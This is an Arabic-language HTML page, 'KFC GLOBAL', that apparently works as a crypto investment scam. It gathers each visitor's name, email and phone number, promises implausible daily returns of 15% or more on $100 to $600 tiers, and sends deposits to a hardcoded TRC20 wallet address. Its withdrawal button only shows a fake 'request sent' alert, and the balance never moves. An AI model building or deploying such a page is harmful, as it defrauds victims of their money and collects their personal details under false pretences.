<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>KFC GLOBAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg: #050a08; }
        body { background-color: var(--bg); color: white; font-family: 'Cairo', sans-serif; margin: 0; }
        .glass { background: rgba(13, 26, 21, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(0, 255, 136, 0.1); }
        .nav-bottom { background: #050a08; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #1a3329; z-index: 5000; }
        .nav-item { color: #4b6b5d; font-size: 11px; text-align: center; cursor: pointer; flex: 1; }
        .nav-item.active { color: var(--primary); }
        .page { display: none; padding-bottom: 120px; animation: fadeIn 0.3s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .btn-main { background: linear-gradient(45deg, #00ff88, #00bd65); color: #050a08; font-weight: 800; border-radius: 16px; width: 100%; padding: 15px; }
        
        /* تصميم الأيقونة مع صورة في الخلفية */
        .icon-bg-wrapper {
            position: relative;
            width: 50px;
            height: 50px;
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            items-center: center;
            justify-content: center;
        }
        .icon-bg-image {
            position: absolute;
            inset: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.4; /* صورة خفيفة في الخلفية */
        }
        .icon-foreground {
            position: relative;
            z-index: 10;
            color: var(--primary);
            font-size: 20px;
        }

        .tier-card { background: rgba(13, 26, 21, 0.8); border: 1px solid rgba(255,255,255,0.05); border-right: 4px solid var(--primary); transition: 0.3s; }
        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(0, 255, 136, 0.2); padding: 15px; border-radius: 15px; color: white; width: 100%; outline: none; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
</head>
<body>

    <div id="tier-modal" class="fixed inset-0 bg-black/90 z-[9999] hidden items-center justify-center p-6">
        <div class="glass p-8 rounded-[35px] w-full max-w-sm text-center border-t-8 border-green-500">
            <h3 id="m-title" class="text-2xl font-black mb-1"></h3>
            <p id="m-monthly" class="text-green-400 font-bold mb-6"></p>
            <div id="m-perks" class="text-right text-xs space-y-3 mb-8 text-gray-400"></div>
            <button onclick="goToDeposit()" class="btn-main">اشتراك مباشر</button>
            <button onclick="closeModal()" class="mt-4 text-xs text-gray-600">إغلاق</button>
        </div>
    </div>

    <div id="auth-screen" class="page active px-8 flex flex-col justify-center min-h-screen">
        <div class="text-center mb-10">
            <h1 class="text-4xl font-black text-green-500 italic">KFC GLOBAL</h1>
            <p class="text-[10px] text-gray-500 mt-2 uppercase">نظام الاستثمار المباشر</p>
        </div>
        <div class="space-y-4 max-w-sm mx-auto w-full text-right">
            <label class="text-xs mr-2 text-gray-400">الاسم الثلاثي:</label>
            <input id="reg-name" type="text" placeholder="أدخل اسمك الحقيقي">
            <label class="text-xs mr-2 text-gray-400">الجيميل:</label>
            <input id="reg-email" type="email" placeholder="example@gmail.com">
            <label class="text-xs mr-2 text-gray-400">رقم الهاتف:</label>
            <input id="reg-phone" type="tel" placeholder="00966...">
            <button onclick="handleLogin()" class="btn-main mt-4">دخول الحساب</button>
        </div>
    </div>

    <div id="main-app" style="display:none">
        <div id="page-home" class="page active px-5 pt-8">
            <div class="flex justify-between items-center mb-8">
                <h2 id="display-name" class="text-lg font-bold"></h2>
                <div class="w-10 h-10 rounded-full bg-green-500/10 border border-green-500 flex items-center justify-center"><i class="fas fa-user text-green-500"></i></div>
            </div>

            <div class="bg-gradient-to-br from-[#0d1a15] to-black p-8 rounded-[35px] mb-8 border border-white/5 text-center">
                <p class="text-[10px] text-gray-500 uppercase mb-2 font-bold">الرصيد الحالي</p>
                <h3 class="text-5xl font-black italic">$<span id="balance">0.00</span></h3>
            </div>

            <h4 class="font-black mb-4">اختر خطة الاستثمار:</h4>
            <div id="plans-container" class="space-y-4">
                </div>
        </div>

        <div id="page-profile" class="page px-6 pt-10">
            <div class="glass p-8 rounded-[40px] space-y-6 text-right">
                <h2 class="text-center font-black text-xl mb-4">معلومات الحساب</h2>
                <div class="text-sm space-y-2">
                    <p><b>الاسم:</b> <span id="p-name"></span></p>
                    <p><b>الهاتف:</b> <span id="p-phone"></span></p>
                    <p><b>البريد:</b> <span id="p-email"></span></p>
                </div>
                <hr class="border-white/5">
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="switchPage('recharge')" class="bg-green-500 text-black p-3 rounded-xl font-bold text-xs">إيداع</button>
                    <button onclick="alert('تم طلب السحب!')" class="bg-red-500/20 text-red-500 p-3 rounded-xl font-bold text-xs border border-red-500/20">سحب الربح</button>
                </div>
                <button onclick="localStorage.clear(); location.reload();" class="w-full p-3 text-gray-600 text-[10px] font-bold">خروج آمن</button>
            </div>
        </div>

        <div id="page-recharge" class="page px-6 pt-10 text-center">
            <div class="glass p-8 rounded-[40px]">
                <h2 class="text-xl font-black mb-6 italic text-green-500">شحن المحفظة (TRC20)</h2>
                <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2" class="w-40 mx-auto mb-6 rounded-2xl">
                <div class="bg-black/40 p-4 rounded-xl text-[10px] font-mono break-all mb-6">TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2</div>
                <button onclick="navigator.clipboard.writeText('TLSr6df3gw3BU6uDjbXHEC2WNUTZKxQbK2');alert('تم النسخ!')" class="btn-main">نسخ العنوان</button>
            </div>
        </div>

        <nav class="nav-bottom">
            <div class="nav-item active" onclick="switchPage('home', this)"><i class="fas fa-home text-xl block mb-1"></i>الرئيسية</div>
            <div class="nav-item" onclick="switchPage('profile', this)"><i class="fas fa-wallet text-xl block mb-1"></i>حسابي</div>
        </nav>
    </div>

    <script>
        const tiers = [
            { id: 1, cost: 100, daily: 15, monthly: 450, name: "Platinum Layer", icon: "fas fa-shield-alt", img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=100", perks: ["عائد يومي $15", "سحب أسبوعي"] },
            { id: 2, cost: 300, daily: 55, monthly: 1650, name: "Diamond Layer", icon: "fas fa-gem", img: "https://images.unsplash.com/photo-1621416848446-991125c75b06?q=80&w=100", perks: ["عائد يومي $55", "سحب مرتين أسبوعياً"] },
            { id: 3, cost: 600, daily: 130, monthly: 3900, name: "Emerald Tier", icon: "fas fa-crown", img: "https://images.unsplash.com/photo-1611974714024-4627d2bc6a2a?q=80&w=100", perks: ["عائد يومي $130", "سحب فوري"] }
        ];

        function handleLogin() {
            const name = document.getElementById('reg-name').value;
            const email = document.getElementById('reg-email').value;
            const phone = document.getElementById('reg-phone').value;
            if(!name || !email || !phone) return alert("أكمل جميع البيانات");
            const user = { name, email, phone, balance: 0 };
            localStorage.setItem('kfc_user', JSON.stringify(user));
            startApp(user);
        }

        function startApp(u) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main-app').style.display = 'block';
            document.getElementById('display-name').innerText = "مرحباً، " + u.name.split(" ")[0];
            document.getElementById('balance').innerText = u.balance.toFixed(2);
            document.getElementById('p-name').innerText = u.name;
            document.getElementById('p-email').innerText = u.email;
            document.getElementById('p-phone').innerText = u.phone;
            renderPlans();
        }

        function renderPlans() {
            document.getElementById('plans-container').innerHTML = tiers.map(t => `
                <div class="tier-card p-4 rounded-2xl flex justify-between items-center" onclick="openModal(${t.id})">
                    <div class="flex items-center gap-4">
                        <div class="icon-bg-wrapper">
                            <img src="${t.img}" class="icon-bg-image">
                            <i class="${t.icon} icon-foreground"></i>
                        </div>
                        <div>
                            <p class="font-black text-sm uppercase">${t.name}</p>
                            <p class="text-green-500 text-[10px]">الربح: $${t.daily} يومياً</p>
                        </div>
                    </div>
                    <p class="font-black text-white">$${t.cost}</p>
                </div>
            `).join('');
        }

        function openModal(id) {
            const t = tiers.find(x => x.id === id);
            document.getElementById('m-title').innerText = t.name;
            document.getElementById('m-monthly').innerText = "العائد الشهري: $" + t.monthly;
            document.getElementById('m-perks').innerHTML = t.perks.map(p => `<div>• ${p}</div>`).join('');
            document.getElementById('tier-modal').style.display = 'flex';
        }

        function closeModal() { document.getElementById('tier-modal').style.display = 'none'; }
        function goToDeposit() { closeModal(); switchPage('recharge'); }

        function switchPage(pId, el) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-' + pId).classList.add('active');
            if(el) {
                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
                el.classList.add('active');
            }
        }

        window.onload = () => {
            const saved = localStorage.getItem('kfc_user');
            if(saved) startApp(JSON.parse(saved));
        };
    </script>
</body>
</html>
